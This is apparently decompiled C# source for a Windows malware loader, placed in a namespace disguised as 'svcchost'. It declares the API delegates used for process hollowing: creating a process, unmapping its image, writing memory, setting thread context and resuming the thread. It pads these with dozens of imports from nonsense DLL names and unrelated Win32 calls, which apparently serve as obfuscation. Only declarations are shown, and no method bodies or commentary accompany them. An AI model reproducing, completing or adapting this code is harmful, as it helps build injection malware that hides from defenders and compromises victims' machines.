using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic;

namespace svcchost;

public class GClass0
{
	public struct ACL1
	{
		public byte AclRevision;

		public byte Sbz1;

		public short AclSize;

		public short AceCount;

		public short Sbz2;
	}

	public struct GENERIC_MAPPING1
	{
		public int GenericRead;

		public int GenericWrite;

		public int GenericExecute;

		public int GenericAll;
	}

	public struct SECURITY_DESCRIPTOR1
	{
		public byte Revision;

		public byte Sbz1;

		public int Control;

		public int Owner;

		public int Group;

		public ACL1 Sacl;

		public ACL21 Dacl;
	}

	public struct POINTAPI11
	{
		public int x;

		public int y;
	}

	public struct ACL21
	{
		public byte AclRevision;

		public byte Sbz1;

		public short AclSize;

		public short AceCount;

		public short Sbz2;
	}

	public struct POINTAPI61
	{
		public int x;

		public int y;
	}

	public struct ACL31
	{
		public byte AclRevision;

		public byte Sbz1;

		public short AclSize;

		public short AceCount;

		public short Sbz2;
	}

	public struct ACL51
	{
		public byte AclRevision;

		public byte Sbz1;

		public short AclSize;

		public short AceCount;

		public short Sbz2;
	}

	public struct LARGE_INTEGER1
	{
		public int lowpart;

		public int highpart;
	}

	public struct PALETTEENTRY1
	{
		public byte peRed;

		public byte peGreen;

		public byte peBlue;

		public byte peFlags;
	}

	public struct COORD11
	{
		public short x;

		public short y;
	}

	public struct EVENTLOGRECORD1
	{
		public int Length;

		public int Reserved;

		public int RecordNumber;

		public int TimeGenerated;

		public int TimeWritten;

		public int EventID;

		public short EventStructure;

		public short NumStrings;

		public short EventCategory;

		public short ReservedFlags;

		public int ClosingRecordNumber;

		public int StringOffset;

		public int UserSidLength;

		public int UserSidOffset;

		public int DataLength;

		public int DataOffset;
	}

	public struct RECT1
	{
		public int Left;

		public int Top;

		public int Right;

		public int Bottom;
	}

	public struct WAVEHDR11
	{
		public string lpData;

		public int dwBufferLength;

		public int dwBytesRecorded;

		public int dwUser;

		public int dwFlags;

		public int dwLoops;

		public int lpNext;

		public int Reserved;
	}

	public struct POINTAPI71
	{
		public int x;

		public int y;
	}

	public struct CANDIDATEFORM1
	{
		public int dwIndex;

		public int dwStyle;

		public POINTAPI11 ptCurrentPos;

		public RECT1 rcArea;
	}

	public struct RECT31
	{
		public int Left;

		public int Top;

		public int Right;

		public int Bottom;
	}

	public struct POINTAPI111
	{
		public int x;

		public int y;
	}

	public struct COMPOSITIONFORM1
	{
		public int dwStyle;

		public POINTAPI11 ptCurrentPos;

		public RECT1 rcArea;
	}

	public struct POINTAPI21
	{
		public int x;

		public int y;
	}

	public struct MIDIHDR11
	{
		public string lpData;

		public int dwBufferLength;

		public int dwBytesRecorded;

		public int dwUser;

		public int dwFlags;

		public int lpNext;

		public int Reserved;
	}

	public struct MIDIINCAPS11
	{
		public short wMid;

		public short wPid;

		public int vDriverVersion;

		public string szPname;
	}

	public struct MIXERCONTROLDETAILS11
	{
		public int cbStruct;

		public int dwControlID;

		public int cChannels;

		public int item;

		public int cbDetails;

		public int paDetails;
	}

	public struct MIXERCAPS11
	{
		public short wMid;

		public short wPid;

		public int vDriverVersion;

		public string szPname;

		public int fdwSupport;

		public int cDestinations;
	}

	public struct MIXERCONTROL11
	{
		public int cbStruct;

		public int dwControlID;

		public int dwControlStructure;

		public int fdwControl;

		public int cMultipleItems;

		public string szShortName;

		public string szName;

		public int[] Bounds;

		public int[] Metrics;
	}

	public struct MIXERLINECONTROLS111
	{
		public int cbStruct;

		public int dwLineID;

		public int dwControl;

		public int cControls;

		public int cbmxctrl;

		public MIXERCONTROL11 pamxctrl;
	}

	public struct GStruct0
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public GStruct1 gstruct1_0;

		public uint uint_7;

		public uint uint_8;

		public uint uint_9;

		public uint uint_10;

		public uint uint_11;

		public uint uint_12;

		public uint uint_13;

		public uint uint_14;

		public uint uint_15;

		public uint uint_16;

		public uint uint_17;

		public uint uint_18;

		public uint uint_19;

		public uint uint_20;

		public uint uint_21;

		public uint uint_22;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
		public byte[] byte_0;
	}

	public struct GStruct1
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		public byte[] byte_0;

		public uint uint_7;
	}

	public struct GStruct2
	{
		public uint uint_0;

		public uint uint_1;
	}

	public struct GStruct3
	{
		public byte byte_0;

		public GStruct2 gstruct2_0;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public uint uint_7;
	}

	public struct GStruct4
	{
		public IntPtr Process;

		public IntPtr intptr_0;

		public int int_0;

		public int int_1;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct GStruct5
	{
		public int CB;

		public string string_0;

		public string string_1;

		public string string_2;

		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;

		public int int_5;

		public int int_6;

		public int int_7;

		public short short_0;

		public short short_1;

		public int int_8;

		public int int_9;

		public int int_10;

		public int int_11;
	}

	public struct GStruct6
	{
		public int int_0;

		public IntPtr intptr_0;

		public int int_1;
	}

	public struct GStruct7
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public ushort ushort_2;

		public ushort ushort_3;

		public ushort ushort_4;

		public ushort ushort_5;

		public ushort ushort_6;

		public ushort ushort_7;

		public ushort ushort_8;

		public ushort ushort_9;

		public ushort ushort_10;

		public ushort ushort_11;

		public ushort ushort_12;

		public ushort ushort_13;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] ushort_14;

		public ushort ushort_15;

		public ushort ushort_16;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] ushort_17;

		public int int_0;
	}

	public struct GStruct8
	{
		public uint uint_0;

		public GStruct9 gstruct9_0;

		public GStruct10 gstruct10_0;
	}

	public struct GStruct9
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public ushort ushort_2;

		public ushort ushort_3;
	}

	public struct GStruct10
	{
		public ushort ushort_0;

		public byte Major;

		public byte Minor;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public uint uint_7;

		public uint uint_8;

		public ushort ushort_1;

		public ushort ushort_2;

		public ushort ushort_3;

		public ushort ushort_4;

		public ushort ushort_5;

		public ushort ushort_6;

		public uint uint_9;

		public uint uint_10;

		public uint uint_11;

		public uint uint_12;

		public ushort ushort_7;

		public ushort ushort_8;

		public uint uint_13;

		public uint uint_14;

		public uint uint_15;

		public uint uint_16;

		public uint uint_17;

		public uint uint_18;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public GStruct11[] YZvBm2GrvaOfwbe9yyc;
	}

	public struct GStruct11
	{
		public uint uint_0;

		public uint uint_1;
	}

	public delegate bool CP(string name, string command, ref GStruct6 process, ref GStruct6 thread, bool inherit, uint flags, IntPtr system, string current, [In] ref GStruct5 startup, out GStruct4 info);

	public delegate bool WPM(IntPtr process, int address, byte[] buffer, int size, out int written);

	public delegate int RPM(IntPtr process, int address, ref int buffer, int size, ref int read);

	public delegate IntPtr VA(IntPtr process, int address, uint size, uint type, uint protect);

	public delegate long UVS(IntPtr process, int address);

	public delegate uint RT(IntPtr thread);

	public delegate bool GTC(IntPtr thread, ref GStruct0 gstruct0_0);

	public delegate bool STC(IntPtr thread, ref GStruct0 gstruct0_0);

	public const int MAXPNAMELEN11 = 32;

	public const int MAXPNAMELEN211 = 32;

	public const int MIXER_SHORT_NAME_CHARS11 = 16;

	public const int MIXER_LONG_NAME_CHARS11 = 64;

	[DebuggerNonUserCode]
	public GClass0()
	{
	}

	[DllImport("yrtyor6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtyrhhqk6op();

	[DllImport("yrtyr6pop.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtyqro6p();

	[DllImport("j43yttj6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int jq43yty6();

	[DllImport("j43ytoi6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int jq43qyt6o();

	[DllImport("yt3y5rtyrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr yt3y5qrt3rty();

	[DllImport("yt3y5r3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr yy5r3qyrty();

	[DllImport("yt3yrt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr yt3yrqt3yrty();

	[DllImport("yrtyrl6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtyrk6qp();

	[DllImport("yrjtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtyqrkk6p();

	[DllImport("yrt44yr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtyrq44K6p();

	[DllImport("lkwdjsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwqkdsdnjfe();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkqwdsdknjfe();

	[DllImport("j43ykjmt6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int jq43ykjmt6();

	[DllImport("j43yKt6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int jq43yKt6();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int j4q3yt6t();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwqdrsdnjfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwqdesdnjfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwqdwsdnjfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtywqr6p();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtysqr6p();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwqdxsdnjfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkqwdss5dnjfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkqwdssdnjfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr ytq3y5rtrty();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr yt3y5qr3yrty();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr yt3yq5rt3ty();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkqwdsdnje();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lqkwdsfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lqkwdjfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkqwdsdfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkqwdsdnjfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int jr4q3yt6();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int j43yqfgt6();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int j43qyt6();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtyqer6p();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtyqrt6p();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtqye6p();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtyr6qp();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtyqtr6p();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr yt3yqyy5rt3yrty();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr ytrt3yqrty();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment aq1();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment aq2();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment aqq3();

	[DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName bq1();

	[DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr cqq1();

	[DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName bq2();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment aq4();

	[DllImport("j43yt6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int cq2();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment aq5();

	[DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName bq3();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment aq7();

	[DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr dq2();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment aq8();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment aq9();

	[DllImport("j43yt6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int c4q();

	[DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName b5q();

	[DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName bq9();

	[DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr dq3();

	[DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr dq4();

	[DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName qb6();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment aq15();

	[DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr dq5();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment aq10();

	[DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName b7q();

	[DllImport("j43yt6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int c5q();

	[DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr qd6();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment aq11();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment qa12();

	[DllImport("j43yt6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int cq6();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment aq13();

	[DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName bq8();

	[DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr dq7();

	[DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr dq8();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment aq14();

	[DllImport("j43yt6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int cq7();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int OemToCharBuffA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszSrc, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszDst, int cchDstLength);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "OemToCharBuffA", ExactSpelling = true, SetLastError = true)]
	public static extern int OemToCharBuffA_1([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszSrc, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszDst, int cchDstLength);

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int OffsetRgn(int hRgn, int x, int y);

	[DllImport("ole32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void OleUninitializeq();

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int OffsetViewportOrgEx(int hdc, int nX, int nY, POINTAPI11 lpPoint);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AccessCheckAndAuditAlarmA([MarshalAs(UnmanagedType.VBByRefStr)] ref string SubsystemName, byte[] HandleId, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ObjectStructureName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ObjectName, SECURITY_DESCRIPTOR1 SecurityDescriptor, int DesiredAccess, GENERIC_MAPPING1 GenericMapping, int ObjectCreation, int GrantedAccess, int AccessStatus, int pfGenerateOnClose);

	[DllImport("pdh.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int PdhVbAddCounter(int QueryHandle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string CounterPath, ref int CounterHandle);

	[DllImport("winspool.drv", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AbortPrinter(int hPrinter);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ActivateKeyboardLayout(int HKL, int flags);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int QueryServiceObjectSecurity(int hService, int dwSecurityInformation, byte[] lpSecurityDescriptor, int cbBufSize, int pcbBytesNeeded);

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int Polyline(int hdc, POINTAPI111 lpPoint, int nCount);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AddAccessAllowedAce(ACL21 pAcl, int dwAceRevision, int AccessMask, byte[] pSid);

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AbortDoc(int hdc);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void RaiseException(int dwExceptionCode, int dwExceptionFlags, int nNumberOfArguments, int lpArguments);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AddAccessDeniedAce(ACL31 pAcl, int dwAceRevision, int AccessMask, byte[] pSid);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ReadConsoleA(int hConsoleInput, byte[] lpBuffer, int nNumberOfCharsToRead, int lpNumberOfCharsRead, byte[] lpReserved);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AddAuditAccessAce(ACL1 pAcl, int dwAceRevision, int dwAccessMask, byte[] pSid, int bAuditSuccess, int bAuditFailure);

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AngleArc(int hdc, int x, int y, int dwRadius, double eStartAngle, double eSweepAngle);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AllocateLocallyUniqueId(LARGE_INTEGER1 Luid);

	[DllImport("winspool.drv", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AddJobA(int hPrinter, int Level, byte pData, int cdBuf, int pcbNeeded);

	[DllImport("winspool.drv", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ReadPrinter(int hPrinter, byte[] pBuf, int cdBuf, int pNoBytesRead);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ReadEventLogA(int hEventLog, int dwReadFlags, int dwRecordOffset, EVENTLOGRECORD1 lpBuffer, int nNumberOfBytesToRead, int pnBytesRead, int pnMinNumberOfBytesNeeded);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ReadConsoleOutputAttribute(int hConsoleOutput, int lpAttribute, int nLength, COORD11 dwReadCoord, int lpNumberOfAttrsRead);

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AnimatePalette(int hPalette, int wStartIndex, int wNumEntries, PALETTEENTRY1 lpPaletteColors);

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AddFontResourceA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ChangeServiceConfigA(int hService, int dwServiceStructure, int dwStartStructure, int dwErrorControl, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpBinaryPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpLoadOrderGroup, int lpdwTagId, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpDependencies, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpServiceStartName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpPassword, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpDisplayName);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int CompareStringA(int Locale, int dwCmpFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString1, int cchCount1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString2, int cchCount2);

	[DllImport("imm32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ImmGetIMEFileNameA(int hkl, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpStr, int uBufLen);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int waveOutPause(int hWaveOut);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int waveOutUnprepareHeader(int hWaveOut, WAVEHDR11 lpWaveOutHdr, int uSize);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int RegQueryValueA(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSubKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValue, int lpcbValue);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SendMessageA(int hwnd, int wMsg, int wParam, byte[] lParam);

	[DllImport("imm32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ImmSetCandidateWindow(int himc, CANDIDATEFORM1 lpCandidateForm);

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SetArcDirection(int hdc, int ArcDirection);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SetClipboardData(int wFormat, int hMem);

	[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int InternetConnectA(int hInternetSession, [MarshalAs(UnmanagedType.VBByRefStr)] ref string sServerName, short nServerPort, [MarshalAs(UnmanagedType.VBByRefStr)] ref string sUsername, [MarshalAs(UnmanagedType.VBByRefStr)] ref string sPassword, int lService, int lFlags, int lContext);

	[DllImport("imm32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ImmSetStatusWindowPos(int himc, POINTAPI11 lpPoint);

	[DllImport("imm32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ImmSetCompositionWindow(int himc, COMPOSITIONFORM1 lpCompositionForm);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int IsCharAlphaNumericA(byte Char2);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int LocalReAlloc(int hMem, int wBytes, int wFlags);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int LockResource(int hResData);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mciGetDeviceIDFromElementIDA(int dwElementID, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrStructure);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, int uReturnLength, int hwndCallback);

	[DllImport("winmm", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mciSetYieldProc(int mciId, int fpYieldProc, int dwYieldData);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int midiInGetDevCapsA(int uDeviceID, MIDIINCAPS11 lpCaps, int uSize);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int midiInAddBuffer(int hMidiIn, MIDIHDR11 lpMidiInHdr, int uSize);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetID(int hmxobj, int pumxID, int fdwId);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetNumDevs();

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerMessage(int hmx, int uMsg, int dwParam1, int dwParam2);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerOpen(int phmx, int uMxId, int dwCallback, int dwInstance, int fdwOpen);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mmioClose(int hmmio, int uFlags);

